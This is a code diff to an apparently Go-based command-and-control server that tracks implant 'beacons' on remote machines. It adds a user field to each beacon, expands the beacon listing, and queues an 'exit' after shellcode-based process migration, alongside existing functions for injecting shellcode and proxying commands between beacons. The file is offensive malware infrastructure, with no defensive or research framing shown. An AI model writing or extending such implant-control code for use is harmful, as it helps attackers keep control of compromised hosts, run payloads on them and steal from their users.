@@ -17,6 +17,7 @@ import (
 type CommandUpdate struct {
 	Ip string
 	Id string
+	User string
 	Platform string
 	Arch string
 	Type string
@@ -26,6 +27,7 @@ type CommandUpdate struct {
 type Beacon struct {
 	Ip string
 	Id string
+	User string
 	Platform string
 	Arch string
 	ExecBuffer []string
@@ -85,7 +87,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 
 	if beacon == nil || beacon.Ip == "n/a" {
 		fmt.Println("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
-		beacon = &Beacon{updateData.Ip, updateData.Id, updateData.Platform, updateData.Arch, nil, nil, nil, nil, nil, time.Now()}
+		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, nil, nil, nil, nil, nil, time.Now() }
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -106,7 +108,7 @@ func listBeacons() {
 			status = " has not checked in yet."
 		}
 
-		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + status)
+		fmt.Println("[" + strconv.Itoa(i) + "] {" + b.Id + "} " + b.User + "@" + b.Ip + " " + b.Platform + "\\" + b.Arch + status)
 	}
 }
 
@@ -296,7 +298,7 @@ func migrateBeacon(cmd []string) {
     encoded := base64.StdEncoding.EncodeToString(content)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[2])
-
+	activeBeacon.ExecBuffer = append(activeBeacon.ExecBuffer, "exit")
 }
 
 func injectShellcode(cmd []string) {
@@ -320,7 +322,7 @@ func injectShellcode(cmd []string) {
 }
 
 func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
-	pseudoBeacon := Beacon { "0.0.0.0", targetId, "", "", nil, nil, nil, nil, nil, time.Now() }
+	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", nil, nil, nil, nil, nil, time.Now() }
 	data, err := json.Marshal(pseudoBeacon)
 	
 	if err != nil {
